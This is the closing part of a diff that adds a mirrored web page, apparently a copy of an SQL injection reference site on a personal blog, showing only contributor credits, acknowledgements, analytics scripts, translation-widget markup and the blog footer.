+						<td><a href="http://sla.ckers.org/forum/read.php?13,50612#msg-50613" target="_blank">id</a></td>
+						<td>Contributed links for the JTR-MSF modules.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/Nurfed1" target="_blank">Nurfed</a></td>
+						<td>Contributed a method for retrieving multiple tables at once in MSSQL 2005+.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/PenTesticles/status/234711294190682112" target="_blank">PenTesticles</a></td>
+						<td>Minor correction to MSSQL xp_cmdshell.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/ryancbarnett" target="_blank">Ryan Barnett</a></td>
+						<td>Brought to my attention an extra method for WAITFOR timing in MSSQL.</td>
+					</tr>
+					<tr>
+						<td><a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#" target="_blank">Spari</a></td>
+						<td>Contributed a huge list of neat tricks.</td>
+					</tr>
+					<tr>
+						<td><a href="http://www.rafayhackingarticles.net/" target="_blank">Rafay Baloch</a></td>
+						<td>Contributed an alternative method for retrieving column count in MySQL.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Extra_Acknowledgements">Acknowledgements</h2>
+				<table class="noborder">
+					<tbody><tr>
+						<td><a href="http://www.hackforums.net/showthread.php?tid=2528569" target="_blank">Hackforums</a></td>
+						<td>A method for retrieving multiple tables/columns at once.</td>
+					</tr>
+					<tr>
+						<td><a href="https://rdot.org/forum/" target="_blank">RDot</a></td>
+						<td>A lot of the error based vectors originated from this site.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Extra_Last_Update">Last Updated</h2>
+				<ul class="data">
+					<a href="http://www.test.com/CHANGELOG.txt" target="_blank">May 29, 2013</a>.
+				</ul>
+			</ul>
+			<br>
+			<section>
+				<div align="center">
+					<p class="powered">
+						Powered by
+					</p>
+					<p>
+						<a href="http://www.websec.ca/" target="_blank"><img src="./SQL-Injection-Knowledge-Base/logoRtranp.gif" width="250px"></a>
+					</p>
+				</div>
+			</section>
+		</div>
+		<script type="text/javascript">
+			var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+			document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+		</script><script src="./SQL-Injection-Knowledge-Base/ga.js" type="text/javascript"></script><script src="./SQL-Injection-Knowledge-Base/ga.js" type="text/javascript"></script>
+		<script type="text/javascript">
+			try {
+				var pageTracker = _gat._getTracker("UA-192381-13");
+				pageTracker._trackPageview();
+			} catch(err) {
+			}
+		</script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./SQL-Injection-Knowledge-Base/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
+	
+<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewbox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"/></svg></div></div></body></html>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+	<a>不要因为走了太久而忘记当初为什么出发。</a>
+    <br>
+	<a>© 2019 shiyan</a>
+	<br>
+  </p>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_uv"> 
+<a>「</a>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+<a>  」</a>
+</span>
+    
+  </div>
+</div>
+</body>
+</html>
